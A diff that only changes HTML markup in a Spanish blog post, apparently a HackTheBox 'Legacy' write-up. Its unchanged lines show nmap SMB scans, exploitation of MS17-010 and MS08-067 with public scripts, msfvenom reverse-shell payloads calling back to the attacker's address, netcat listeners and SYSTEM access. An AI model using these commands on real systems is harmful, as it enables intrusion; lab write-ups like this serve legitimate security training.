@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/legacy/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la maquina <code class="highlighter-rouge">Legacy</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la maquina <code class="language-plaintext highlighter-rouge">Legacy</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">legacy</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">legacy</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mkhack legacy
 ❯ <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ osping 10.10.10.4
   
@@ -40,7 +40,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   445/tcp open  microsoft-ds
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ nmap <span class="nt">-p135</span>,139,445 <span class="nt">-sCV</span> 10.10.10.4 <span class="nt">-oN</span> versions
   PORT    STATE SERVICE      VERSION
@@ -69,7 +69,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento-smb">RECONOCIMIENTO SMB</h2>
 
-<p>Iniciamos con el reconocimiento del servicio <code class="highlighter-rouge">smb</code> donde inicialmente ejecutamos todos los scripts potencialmente vulnerables soportados por nmap, en búsqueda de posibles CVEs vulnerables en la máquina.</p>
+<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">smb</code> donde inicialmente ejecutamos todos los scripts potencialmente vulnerables soportados por nmap, en búsqueda de posibles CVEs vulnerables en la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ nmap <span class="nt">-p135</span>,139,445 10.10.10.4 <span class="nt">--script</span> <span class="s2">"smb-vuln*"</span>
   Host script results:
@@ -104,7 +104,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   |_smb-vuln-ms10-054: <span class="nb">false</span>
 </code></pre></div></div>
 
-<p>¡Encontramos dos CVE que presentan vulnerabilidades en la máquina! <code class="highlighter-rouge">ms17-010</code> y <code class="highlighter-rouge">MS08-067</code>.</p>
+<p>¡Encontramos dos CVE que presentan vulnerabilidades en la máquina! <code class="language-plaintext highlighter-rouge">ms17-010</code> y <code class="language-plaintext highlighter-rouge">MS08-067</code>.</p>
 
 <h2 id="explotacion-por-ms17-010">EXPLOTACION POR MS17-010</h2>
 <p>Vamos a realizar la explotación de nuestro primer CVE, para este caso haremos uso del script de github de <a href="https://github.com/helviojunior/MS17-010">helviojunior</a> <em>para esta explotación es necesario tener instalado python2</em>.</p>
@@ -124,7 +124,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  pip <span class="nb">install </span>impacket
 </code></pre></div></div>
 
-<p>Como primer paso, vamos a ejecutar el <code class="highlighter-rouge">checker.py</code> que nos ayuda a identificar el nombre del pipe que vamos a utilizar en el script de explotación.</p>
+<p>Como primer paso, vamos a ejecutar el <code class="language-plaintext highlighter-rouge">checker.py</code> que nos ayuda a identificar el nombre del pipe que vamos a utilizar en el script de explotación.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ❯ python checker.py 10.10.10.4
   Trying to connect to 10.10.10.4:445
@@ -139,14 +139,14 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   browser: Ok <span class="o">(</span>32 bit<span class="o">)</span>
 </code></pre></div></div>
 
-<p>Tal como podemos ver, los nombres de pipe que podemos utilizar son los de status <strong>OK</strong>, en este caso <code class="highlighter-rouge">spoolss</code> y <code class="highlighter-rouge">browser</code>.</p>
+<p>Tal como podemos ver, los nombres de pipe que podemos utilizar son los de status <strong>OK</strong>, en este caso <code class="language-plaintext highlighter-rouge">spoolss</code> y <code class="language-plaintext highlighter-rouge">browser</code>.</p>
 
-<p>Para poder tener éxito, es necesario generar una reverse shell por medio de la utilidad <code class="highlighter-rouge">msfvenom</code> con nuestra dirección IP y puerto de escucha para obtener posteriormente la shell denominada <code class="highlighter-rouge">reverseShell.exe</code></p>
+<p>Para poder tener éxito, es necesario generar una reverse shell por medio de la utilidad <code class="language-plaintext highlighter-rouge">msfvenom</code> con nuestra dirección IP y puerto de escucha para obtener posteriormente la shell denominada <code class="language-plaintext highlighter-rouge">reverseShell.exe</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.6 <span class="nv">LPORT</span><span class="o">=</span>4564 <span class="nt">-f</span> exe <span class="nt">-o</span> reverseShell.exe
 </code></pre></div></div>
 
-<p>Ahora que tenemos el pipe y la reverse shell generada, procedemos a ejecutar el script de explotación <code class="highlighter-rouge">send_and_execute.py</code> para cargar y ejecutar el payload.</p>
+<p>Ahora que tenemos el pipe y la reverse shell generada, procedemos a ejecutar el script de explotación <code class="language-plaintext highlighter-rouge">send_and_execute.py</code> para cargar y ejecutar el payload.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ python send_and_execute.py 10.10.10.4 reverseShell.exe 445 spoolss
   Trying to connect to 10.10.10.4:445
@@ -180,7 +180,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   Done
 </code></pre></div></div>
 
-<p>Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario <code class="highlighter-rouge">NT Authority/System</code></p>
+<p>Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario <code class="language-plaintext highlighter-rouge">NT Authority/System</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ rlwrap nc <span class="nt">-lvnp</span> 4564
   listening on <span class="o">[</span>any] 4564 ...
@@ -213,7 +213,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   pip <span class="nb">install </span>pycrypto
 </code></pre></div></div>
 
-<p>Al igual que en la anterior explotación, por medio de <code class="highlighter-rouge">msfvenom</code> generamos una reverse shell, pero en este caso generamos un shellcode el cual vamos a reemplazar directamente en el script de explotación</p>
+<p>Al igual que en la anterior explotación, por medio de <code class="language-plaintext highlighter-rouge">msfvenom</code> generamos una reverse shell, pero en este caso generamos un shellcode el cual vamos a reemplazar directamente en el script de explotación</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.7 <span class="nv">LPORT</span><span class="o">=</span>4564 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">5  c</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">40"</span> <span class="nt">-f</span> c <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows
 </code></pre></div></div>
@@ -274,7 +274,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   
   Ponemos un listener logrando obtener una reverse shell exitosamente
 </code></pre></div></div>
-<p>Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario <code class="highlighter-rouge">NT Authority/System</code></p>
+<p>Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario <code class="language-plaintext highlighter-rouge">NT Authority/System</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ rlwrap nc <span class="nt">-lvnp</span> 4564
   listening on <span class="o">[</span>any] 4564 ...
@@ -293,7 +293,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">dir</span> /b/s user.txt
  C:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
@@ -309,9 +309,9 @@ echo.%root:~0,10%
 993442d258
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">Legacy</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">Legacy</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/legacy/03-finish.png" />
 </p>
 
